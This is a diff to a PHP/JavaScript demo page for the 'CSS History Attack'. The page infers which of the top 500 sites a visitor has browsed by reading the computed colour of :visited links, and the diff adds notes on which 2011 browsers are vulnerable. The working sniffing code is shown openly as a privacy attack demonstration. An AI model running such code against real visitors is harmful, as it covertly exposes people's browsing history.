@@ -12,8 +12,9 @@ if (isset($_GET['l']))
 <html>
 <head><style>h1 {background-color: #888888;} a {color: <? echo($s1) ?>; font-size: 30px;} a:visited{color: <? echo($s2) ?>; font-size: 16px;} </style></head>
 <body>
-<h1>CSS History Attack</h1>
-
+<h1>CSS History Attack - You've visited the following sites (from a list of the top 500)</h1>
+<h2>Firefox 3.6.15 and IE 8.0.7600.16385 are vulnerable, Chrome is not as of March 12, 2011</h2>
+See <a href="http://whattheinternetknowsaboutyou.com">What the Internet Knows About You</a> for a more extensive version of this privacy attack.
 
 <div id="results1"></div><br><div id="results2"></div></br>
 <!--For debugging: if you've visited Google and your browser is vulnerable, the first link should look different than the second one (except IE, which is also vulnerable).
@@ -34,12 +35,8 @@ if (document.defaultView)
 	IE = false;
 }
 var a = document.createElement('a');
-a.href = 'http://google.com';
-a.innerHTML = "Click Here!";
+//a.href = 'http://google.com';
 document.body.appendChild(a);
-var b = document.createElement('a');
-b.href = 'http://fdasadfsadfsa.com';
-b.innerHTML = "Click Here2!";
 
 for (l = 0; l< <? echo($l); ?>; l++) //optional loop for performance testing
 {
@@ -54,7 +51,7 @@ for (l = 0; l< <? echo($l); ?>; l++) //optional loop for performance testing
 			document.body.appendChild(d);
 			if (d.currentStyle.color == '<?echo($s3)?>' )
 			{
-				results1.innerHTML += d.href+" ";
+				results1.innerHTML += d.href+"<br>";
 			}
 		}
 		else
@@ -62,7 +59,7 @@ for (l = 0; l< <? echo($l); ?>; l++) //optional loop for performance testing
 			a.href = "http://www." + sites[i];
 			if (document.defaultView.getComputedStyle(a,null).getPropertyValue('color') == '<?echo($s2)?>' )
 			{
-				results1.innerHTML += a.href;
+				results1.innerHTML += a.href+"<br>";
 			}
 		}
 	}
